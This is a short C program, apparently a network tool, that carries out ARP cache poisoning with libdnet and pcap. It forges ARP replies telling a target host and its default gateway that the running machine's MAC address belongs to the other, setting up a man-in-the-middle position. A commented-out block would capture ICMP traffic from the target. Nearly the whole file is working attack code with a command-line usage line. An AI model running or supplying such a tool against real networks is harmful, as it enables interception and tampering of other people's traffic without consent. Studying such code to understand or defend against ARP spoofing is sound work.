#include <stdio.h>
#include <unistd.h>
#include <dnet.h>
#include <string.h>
#include <stdlib.h>
#include "pcap.h"
#include "raw.h"

void arpPoison(struct addr* targetIp, struct addr* recordIp, struct addr* recordHw){
    pcap_t* cap = setPromiscuous(Settings.device,"arp");

    printf("making arp packet...\n");
    struct addr targetHw;
    getMacAddress(targetIp, &targetHw);
    uint8_t* arp = getArpPacket(NULL,
            ARP_REPLY,
            (uint8_t*)&recordHw->addr_eth,
            recordIp->addr_ip,
            (uint8_t*)&targetHw.addr_eth,
            targetIp->addr_ip
            );



    printf("sending arp packet...\n");

    pcap_inject(cap, arp, ETHER_H_SIZE + ARP_H_SIZE);
}
int main(int argc, char* argv[]){
   if (argc < 3){
        printf("usage: ./%s <interface> <target ip>\n", argv[0]);
        return 1;
    }
    struct addr targetIp;
    initHost(argv[1]);
    addr_pton(argv[2], &targetIp);

    printf("poisoning target %s...\n", argv[2]);
    arpPoison(  &targetIp,
                &Settings.defaultIp,
                &Settings.hostHw);

    printf("poisoning gateway %s...\n", addr_ntoa(&Settings.defaultIp));
    arpPoison(  &Settings.defaultIp,
                &targetIp,
                &Settings.hostHw);
/*    IPSocket* raw = getRawSocket(targetIp.addr_ip, 0, IP_ICMP, RAW_BIND);
    int r;
    char buffer[10000];
    for(;;){
        r = Recvfrom(raw, buffer, sizeof(buffer));
        printf("recv'd %d ICMP bytes from %s\n",r, addr_ntoa(&targetIp));
    }*/
    return 0;
}


